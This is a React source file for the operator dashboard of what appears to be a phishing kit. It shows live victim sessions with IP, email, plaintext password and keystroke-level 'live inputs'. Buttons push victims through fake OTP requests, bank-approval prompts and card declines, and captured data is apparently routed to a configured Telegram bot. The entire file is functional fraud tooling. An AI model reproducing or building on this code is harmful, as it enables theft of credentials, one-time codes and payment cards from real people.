'use client';
import React, { useState, useEffect } from 'react';
import {
  LogOut, RefreshCw, Trash2, Eye, MessageSquare, CreditCard,
  ShieldAlert, CheckCheck, Save, Settings, Users
} from 'lucide-react';

interface Session {
  id: string;
  ip: string;
  country: string;
  currentPage: string;
  status: string;
  lastSeen: number;
  email?: string;
  password?: string;
}

interface AdminPanelProps {
  onBack: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [activeTab, setActiveTab] = useState<'sessions' | 'config' | 'security'>('sessions');
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  const [currentAction, setCurrentAction] = useState<Record<string, string>>({});
  const [liveInputs, setLiveInputs] = useState<Record<string, unknown>>({});

  // Bot config state
  const [botToken, setBotToken] = useState('');
  const [chatId, setChatId] = useState('');
  const [saveStatus, setSaveStatus] = useState<'idle' | 'saving' | 'saved' | 'error'>('idle');
  const [testStatus, setTestStatus] = useState<'idle' | 'testing' | 'ok' | 'fail'>('idle');
  const [configLoaded, setConfigLoaded] = useState(false);

  // Load saved bot config from SERVER on mount (works across all browsers/sessions)
  useEffect(() => {
    const loadConfig = async () => {
      try {
        const res = await fetch('/api/config', { cache: 'no-store' });
        const data = await res.json();
        if (data.token) setBotToken(data.token);
        if (data.chatId) setChatId(data.chatId);
      } catch (e) {
        console.warn('[Admin] Failed to load config from server:', e);
        // Fallback to localStorage
        try {
          const raw = localStorage.getItem('track_bot_config');
          if (raw) {
            const parsed = JSON.parse(raw);
            if (parsed.token) setBotToken(parsed.token);
            if (parsed.chatId) setChatId(parsed.chatId);
          }
        } catch {}
      }
      setConfigLoaded(true);
    };
    loadConfig();
  }, []);

  // Poll sessions every second
  useEffect(() => {
    const update = async () => {
      try {
        const res = await fetch('/api/sessions');
        const data: Record<string, Omit<Session, 'id'>> = await res.json();
        setSessions(Object.entries(data).map(([id, s]) => ({ id, ...s })));
      } catch {}
    };
    const timer = setInterval(update, 1000);
    update();
    return () => clearInterval(timer);
  }, []);

  // Poll live inputs for selected session
  useEffect(() => {
    if (!selectedSessionId) return;
    const update = async () => {
      try {
        const res = await fetch(`/api/inputs/${selectedSessionId}`);
        const data = await res.json();
        setLiveInputs(data);
      } catch {}
    };
    const timer = setInterval(update, 1000);
    update();
    return () => clearInterval(timer);
  }, [selectedSessionId]);

  const handleAction = async (sessionId: string, action: string) => {
    try {
      await fetch(`/api/actions/${sessionId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action }),
      });
      setCurrentAction(prev => ({ ...prev, [sessionId]: action }));
    } catch {}
  };

  const clearSession = async (sessionId: string) => {
    try {
      await fetch(`/api/sessions/${sessionId}`, { method: 'DELETE' });
      if (selectedSessionId === sessionId) setSelectedSessionId(null);
    } catch {}
  };

  const clearAllSessions = async () => {
    for (const session of sessions) {
      await fetch(`/api/sessions/${session.id}`, { method: 'DELETE' });
    }
    setSessions([]);
    setSelectedSessionId(null);
  };

  // Allow negative numbers for Telegram group/channel IDs
  const handleChatIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    // Allow: empty, minus sign alone, or minus + digits, or just digits
    if (val === '' || val === '-' || /^-?\d+$/.test(val)) {
      setChatId(val);
    }
  };

  const handleSaveConfig = async () => {
    const trimToken = botToken.trim();
    const trimChatId = chatId.trim();
    if (!trimToken || !trimChatId) return;
    setSaveStatus('saving');
    try {
      // Save to server-side API (persists without redeployment)
      const res = await fetch('/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: trimToken, chatId: trimChatId }),
      });
      const data = await res.json();
      if (!data.ok) throw new Error(data.error);

      // Also cache in localStorage for instant reads
      try {
        localStorage.setItem('track_bot_config', JSON.stringify({ token: trimToken, chatId: trimChatId }));
      } catch {}

      setSaveStatus('saved');
      setTimeout(() => setSaveStatus('idle'), 3000);
    } catch (e) {
      console.error('[Admin] Save config failed:', e);
      setSaveStatus('error');
      setTimeout(() => setSaveStatus('idle'), 3000);
    }
  };

  const handleTestConfig = async () => {
    const trimToken = botToken.trim();
    const trimChatId = chatId.trim();
    if (!trimToken || !trimChatId) return;
    setTestStatus('testing');
    try {
      const res = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token: trimToken,
          chatId: trimChatId,
          text: '✅ <b>Track Admin</b> — Bot configuration test successful!\n\nYour Telegram bot is working correctly.',
        }),
      });
      const data = await res.json();
      setTestStatus(data.ok ? 'ok' : 'fail');
      if (!data.ok) {
        console.error('[Admin] Test failed:', data.description || data.error);
      }
    } catch (e) {
      console.error('[Admin] Test error:', e);
      setTestStatus('fail');
    }
    setTimeout(() => setTestStatus('idle'), 4000);
  };

  const selectedSession = sessions.find(s => s.id === selectedSessionId);
  const timeSince = (ts: number) => {
    const s = Math.floor((Date.now() - ts) / 1000);
    if (s < 60) return `${s}s ago`;
    return `${Math.floor(s / 60)}m ago`;
  };

  return (
    <div className="min-h-screen bg-[#0d1421] text-[#94a3b8] p-4 md:p-8 font-sans">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
          <div>
            <h1 className="text-3xl font-bold text-white mb-2 tracking-tight">Admin Dashboard</h1>
            <p className="text-slate-500 text-sm">Manage sessions, Telegram configuration, and security settings</p>
          </div>
          <button
            onClick={onBack}
            className="flex items-center gap-2 bg-[#ef4444] hover:bg-red-600 text-white px-5 py-2 rounded-lg font-bold transition-all active:scale-95 shadow-lg shadow-red-500/20"
          >
            <LogOut className="w-4 h-4" /> Logout
          </button>
        </header>

        {/* Tabs */}
        <nav className="flex items-center gap-1 bg-[#1a2333] p-1.5 rounded-xl mb-10 w-full max-w-2xl border border-slate-800">
          {[
            { id: 'sessions', label: 'Active Sessions', icon: <Users className="w-4 h-4" /> },
            { id: 'config', label: 'Telegram Config', icon: <Settings className="w-4 h-4" /> },
            { id: 'security', label: 'Security', icon: <ShieldAlert className="w-4 h-4" /> },
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as 'sessions' | 'config' | 'security')}
              className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                activeTab === tab.id ? 'bg-[#2d3a4f] text-white shadow-md' : 'text-slate-500 hover:text-slate-300'
              }`}
            >
              {tab.icon} {tab.label}
            </button>
          ))}
        </nav>

        {/* Sessions Tab */}
        {activeTab === 'sessions' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Session list */}
            <div className="bg-[#151d2c] border border-slate-800 rounded-2xl p-6">
              <div className="flex items-center justify-between mb-6">
                <div>
                  <h2 className="text-lg font-bold text-white">Active Sessions</h2>
                  <p className="text-xs text-slate-500 mt-1">{sessions.length} user{sessions.length !== 1 ? 's' : ''} online</p>
                </div>
                {sessions.length > 0 && (
                  <button
                    onClick={clearAllSessions}
                    className="flex items-center gap-2 text-xs text-red-400 hover:text-red-300 border border-red-900/50 hover:border-red-700 px-3 py-1.5 rounded-lg transition-all"
                  >
                    <Trash2 className="w-3 h-3" /> Clear All
                  </button>
                )}
              </div>

              {sessions.length === 0 ? (
                <div className="text-center py-12 text-slate-600">
                  <Users className="w-10 h-10 mx-auto mb-3 opacity-30" />
                  <p className="text-sm">No active sessions</p>
                </div>
              ) : (
                <div className="space-y-3">
                  {sessions.map(session => (
                    <div
                      key={session.id}
                      onClick={() => setSelectedSessionId(session.id)}
                      className={`p-4 rounded-xl border cursor-pointer transition-all ${
                        selectedSessionId === session.id
                          ? 'border-blue-500/50 bg-blue-500/5'
                          : 'border-slate-800 hover:border-slate-600 bg-[#0d1421]'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <div className={`w-2 h-2 rounded-full ${session.status === 'online' ? 'bg-emerald-400 animate-pulse' : 'bg-slate-600'}`} />
                          <span className="text-sm font-semibold text-white">{session.country || 'Unknown'}</span>
                        </div>
                        <span className="text-xs text-slate-500">{timeSince(session.lastSeen)}</span>
                      </div>
                      <div className="text-xs text-slate-500 space-y-1">
                        <div>IP: <span className="font-mono text-slate-400">{session.ip}</span></div>
                        <div>Page: <span className="text-blue-400">{session.currentPage}</span></div>
                        {session.email && <div>Email: <span className="text-slate-300">{session.email}</span></div>}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Session detail */}
            <div className="bg-[#151d2c] border border-slate-800 rounded-2xl p-6">
              {!selectedSession ? (
                <div className="text-center py-12 text-slate-600">
                  <Eye className="w-10 h-10 mx-auto mb-3 opacity-30" />
                  <p className="text-sm">Select a session to view details</p>
                </div>
              ) : (
                <div className="space-y-6">
                  <div className="flex items-center justify-between">
                    <h2 className="text-lg font-bold text-white">Session Details</h2>
                    <button
                      onClick={() => clearSession(selectedSession.id)}
                      className="text-xs text-red-400 hover:text-red-300 flex items-center gap-1"
                    >
                      <Trash2 className="w-3 h-3" /> Remove
                    </button>
                  </div>

                  {/* Info */}
                  <div className="bg-[#0d1421] rounded-xl p-4 space-y-2 text-sm">
                    {[
                      ['IP', selectedSession.ip],
                      ['Country', selectedSession.country],
                      ['Page', selectedSession.currentPage],
                      ['Status', selectedSession.status],
                      ['Email', selectedSession.email || '—'],
                      ['Password', selectedSession.password || '—'],
                    ].map(([label, value]) => (
                      <div key={label} className="flex justify-between">
                        <span className="text-slate-500">{label}</span>
                        <span className="font-mono text-slate-300 text-right max-w-[200px] truncate">{value}</span>
                      </div>
                    ))}
                  </div>

                  {/* Live inputs */}
                  {Object.keys(liveInputs).length > 0 && (
                    <div className="bg-[#0d1421] rounded-xl p-4 space-y-2 text-sm">
                      <p className="text-[10px] font-black uppercase tracking-widest text-slate-600 mb-3">Live Inputs</p>
                      {Object.entries(liveInputs).map(([k, v]) => (
                        <div key={k} className="flex justify-between">
                          <span className="text-slate-500">{k}</span>
                          <span className="font-mono text-slate-300">{String(v)}</span>
                        </div>
                      ))}
                    </div>
                  )}

                  {/* Actions */}
                  <div className="space-y-3">
                    <p className="text-[10px] font-black uppercase tracking-widest text-slate-600">Remote Actions</p>
                    <div className="grid grid-cols-2 gap-2">
                      {[
                        { action: 'otp', label: 'Request OTP', icon: <MessageSquare className="w-4 h-4" />, color: 'border-blue-500 text-blue-400 hover:bg-blue-500/10' },
                        { action: 'bank_approval', label: 'Bank Approval', icon: <ShieldAlert className="w-4 h-4" />, color: 'border-amber-500 text-amber-400 hover:bg-amber-500/10' },
                        { action: 'invalid_otp', label: 'Invalid OTP', icon: <RefreshCw className="w-4 h-4" />, color: 'border-orange-500 text-orange-400 hover:bg-orange-500/10' },
                        { action: 'declined', label: 'Decline Card', icon: <CreditCard className="w-4 h-4" />, color: 'border-red-500 text-red-400 hover:bg-red-500/10' },
                        { action: 'block', label: 'Block User', icon: <ShieldAlert className="w-4 h-4" />, color: 'border-slate-500 text-slate-400 hover:bg-slate-500/10' },
                        { action: 'normal', label: 'Reset', icon: <RefreshCw className="w-4 h-4" />, color: 'border-emerald-500 text-emerald-400 hover:bg-emerald-500/10' },
                      ].map(({ action, label, icon, color }) => (
                        <button
                          key={action}
                          onClick={() => handleAction(selectedSession.id, action)}
                          className={`flex items-center justify-center gap-2 py-3 px-3 rounded-xl border-2 transition-all font-bold text-xs ${color} ${
                            currentAction[selectedSession.id] === action ? 'ring-2 ring-white/20 bg-white/5' : ''
                          } active:scale-95`}
                        >
                          {icon} {label}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Config Tab */}
        {activeTab === 'config' && (
          <div className="max-w-xl space-y-6">
            <div className="bg-[#151d2c] border border-slate-800 rounded-2xl p-6 space-y-6">
              <div>
                <h2 className="text-lg font-bold text-white mb-1">Telegram Bot Configuration</h2>
                <p className="text-xs text-slate-500">
                  Configure your bot token and chat ID to receive notifications.
                  Config is saved server-side — no redeployment needed.
                </p>
              </div>

              {!configLoaded && (
                <div className="flex items-center gap-2 text-slate-500 text-sm">
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  Loading saved config...
                </div>
              )}

              <div className="space-y-4">
                <div>
                  <label className="text-xs font-bold uppercase tracking-widest text-slate-500 mb-2 block">Bot Token</label>
                  <input
                    type="text"
                    value={botToken}
                    onChange={e => setBotToken(e.target.value)}
                    placeholder="1234567890:ABCdef..."
                    className="w-full bg-[#0d1421] border border-slate-700 rounded-xl p-4 text-white font-mono text-sm outline-none focus:border-blue-500/70 transition-all placeholder:text-slate-700"
                  />
                </div>

                <div>
                  <label className="text-xs font-bold uppercase tracking-widest text-slate-500 mb-2 block">
                    Chat ID
                    <span className="ml-2 text-slate-600 normal-case font-normal">(use negative ID for groups/channels, e.g. -1001234567890)</span>
                  </label>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={chatId}
                    onChange={handleChatIdChange}
                    placeholder="-1001234567890 or 5219969216"
                    className="w-full bg-[#0d1421] border border-slate-700 rounded-xl p-4 text-white font-mono text-sm outline-none focus:border-blue-500/70 transition-all placeholder:text-slate-700"
                  />
                </div>

                <div className="flex gap-3 pt-2">
                  <button
                    onClick={handleSaveConfig}
                    disabled={!botToken.trim() || !chatId.trim() || saveStatus === 'saving'}
                    className={`flex-1 flex items-center justify-center gap-2 py-4 rounded-xl font-bold transition-all active:scale-[0.98] shadow-lg ${
                      saveStatus === 'saved' ? 'bg-emerald-600 text-white' :
                      saveStatus === 'error' ? 'bg-red-600 text-white' :
                      saveStatus === 'saving' ? 'bg-blue-700 text-white' :
                      'bg-blue-600 hover:bg-blue-500 text-white disabled:opacity-50 disabled:cursor-not-allowed'
                    }`}
                  >
                    {saveStatus === 'saving' ? <><RefreshCw className="w-4 h-4 animate-spin" /> Saving...</> :
                     saveStatus === 'saved' ? <><CheckCheck className="w-4 h-4" /> Saved!</> :
                     saveStatus === 'error' ? <>Save Failed — Retry</> :
                     <><Save className="w-4 h-4" /> Save Config</>}
                  </button>

                  <button
                    onClick={handleTestConfig}
                    disabled={!botToken.trim() || !chatId.trim() || testStatus === 'testing'}
                    className={`flex-1 flex items-center justify-center gap-2 py-4 rounded-xl font-bold transition-all active:scale-[0.98] border-2 ${
                      testStatus === 'ok' ? 'border-emerald-500 text-emerald-400 bg-emerald-500/10' :
                      testStatus === 'fail' ? 'border-red-500 text-red-400 bg-red-500/10' :
                      testStatus === 'testing' ? 'border-slate-600 text-slate-400' :
                      'border-slate-600 text-slate-300 hover:border-slate-400 disabled:opacity-50'
                    }`}
                  >
                    {testStatus === 'testing' ? <><RefreshCw className="w-4 h-4 animate-spin" /> Testing...</> :
                     testStatus === 'ok' ? <><CheckCheck className="w-4 h-4" /> Message Sent!</> :
                     testStatus === 'fail' ? <>Test Failed — Check token/ID</> :
                     <>Test Bot</>}
                  </button>
                </div>

                {/* Current config preview */}
                <div className="bg-[#0d1421] border border-slate-800 rounded-xl p-4 space-y-2">
                  <p className="text-[10px] font-black uppercase tracking-widest text-slate-600 mb-3">Currently Active Config</p>
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-xs text-slate-500">Token</span>
                    <span className="text-xs font-mono text-slate-300 truncate max-w-[260px]">
                      {botToken ? `${botToken.slice(0, 10)}...${botToken.slice(-6)}` : '— not set —'}
                    </span>
                  </div>
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-xs text-slate-500">Chat ID</span>
                    <span className="text-xs font-mono text-slate-300">{chatId || '— not set —'}</span>
                  </div>
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-xs text-slate-500">Status</span>
                    <span className={`text-xs font-bold ${botToken && chatId ? 'text-emerald-400' : 'text-red-400'}`}>
                      {botToken && chatId ? '✓ Configured' : '✗ Not configured'}
                    </span>
                  </div>
                </div>

                {/* Instructions */}
                <div className="bg-blue-500/5 border border-blue-500/20 rounded-xl p-4 space-y-2">
                  <p className="text-xs font-bold text-blue-400 uppercase tracking-widest">How to get your Bot Token & Chat ID</p>
                  <ol className="text-xs text-slate-400 space-y-1 list-decimal list-inside">
                    <li>Open Telegram and search for <span className="font-mono text-slate-300">@BotFather</span></li>
                    <li>Send <span className="font-mono text-slate-300">/newbot</span> and follow the steps</li>
                    <li>Copy the token (format: <span className="font-mono text-slate-300">123456:ABC-DEF...</span>)</li>
                    <li>For Chat ID: message your bot, then visit <span className="font-mono text-slate-300">api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</span></li>
                    <li>For groups: add bot as admin, use negative ID (e.g. <span className="font-mono text-slate-300">-1001234567890</span>)</li>
                  </ol>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Security Tab */}
        {activeTab === 'security' && (
          <div className="max-w-xl">
            <div className="bg-[#151d2c] border border-slate-800 rounded-2xl p-6 space-y-4">
              <h2 className="text-lg font-bold text-white">Security Settings</h2>
              <p className="text-sm text-slate-500">Advanced security configuration options.</p>
              <div className="bg-[#0d1421] border border-slate-800 rounded-xl p-4 text-center">
                <ShieldAlert className="w-8 h-8 text-slate-600 mx-auto mb-2" />
                <p className="text-sm text-slate-500">Security settings coming soon</p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
